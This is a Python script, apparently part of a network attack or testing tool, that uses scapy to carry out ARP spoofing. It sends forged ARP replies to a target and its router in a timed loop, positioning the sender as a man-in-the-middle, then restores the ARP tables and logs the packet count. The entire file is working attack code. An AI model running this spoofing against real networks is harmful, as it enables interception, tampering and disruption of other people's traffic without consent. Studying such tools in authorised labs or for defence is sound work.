#! /usr/bin/env python3

import scapy.all as scapy
import time
from datetime import datetime
import subprocess
from random import randint as random


def spoof(source, target):
    packet = scapy.ARP(op=2,
                       psrc=target['ip'],
                       hwdst=source['mac'],
                       pdst=source['ip'])
    scapy.send(packet, verbose=False, count=2)


def restore_arp_table(target, router):
    packet = scapy.ARP(op=2,
                       pdst=target['ip'],
                       hwdst=target['mac'],
                       psrc=router['ip'],
                       hwsrc=router['mac'])
    scapy.send(packet, verbose=False, count=4)

    packet = scapy.ARP(op=2,
                       pdst=router['ip'],
                       hwdst=router['mac'],
                       psrc=target['ip'],
                       hwsrc=target['mac'])
    scapy.send(packet, verbose=False, count=4)


class ARPAttack:

    def __init__(self, interface, target, router, log_file, verbose, report_file):
        self.interface = interface
        self.target = target
        self.router = router
        self.log_file = log_file
        self.verbose = verbose
        self.__dt_format = "%H:%M:%S"
        self.report_file = report_file

    def start_arp(self):

        packets_count = 0
        time_in_min = random(5, 11)
        end_time = time.time() + 60 * time_in_min

        print("\n[+] ARP Attack for {0} minutes.".format(time_in_min))

        self.log_file.write("\n[{0}] ARP Attack for {1} minutes."
                            .format(datetime.now().strftime(self.__dt_format), time_in_min))

        while time.time() <= end_time:

            spoof(self.target, self.router)
            spoof(self.router, self.target)

            packets_count += 2

            if self.verbose == 'yes':
                print("\r[+] Sent {0} packets.".format(packets_count), end="")
            time.sleep(4)

        if self.verbose == 'yes':
            print("\n[+] Restoring ARP Tables...\n")
        restore_arp_table(self.target, self.router)

        return packets_count
